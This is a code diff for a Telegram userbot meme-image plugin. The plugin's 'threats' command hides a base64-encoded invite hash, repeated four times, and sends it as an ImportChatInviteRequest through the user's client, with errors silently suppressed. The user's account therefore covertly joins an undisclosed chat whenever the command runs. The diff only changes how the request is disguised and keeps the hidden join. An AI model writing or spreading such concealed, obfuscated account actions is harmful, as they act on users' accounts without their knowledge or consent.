@@ -4,7 +4,7 @@ import nekos
 from . import *
 import os 
 import pybase64
-from telethon.tl.functions.messages import ImportChatInviteRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
 @borg.on(admin_cmd(pattern = "threats(?: |$)(.*)"))
 async def catbot(catmemes):
@@ -20,7 +20,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
         await catmemes.client(cat)
     except:
         pass
@@ -64,7 +65,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
         await catmemes.client(cat)
     except:
         pass 
@@ -115,7 +117,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
         await catmemes.client(cat)
     except:
         pass 
@@ -166,7 +169,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        cat = Get(cat)
         await catmemes.client(cat)
     except:
         pass
@@ -194,4 +198,4 @@ async def catbot(catmemes):
     cat = f"https://telegra.ph{response[0]}"
     cat = await phcomment(cat,text,username)
     await catmemes.delete()
-    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)    
+    await borg.send_file(catmemes.chat_id , cat,reply_to=replied)
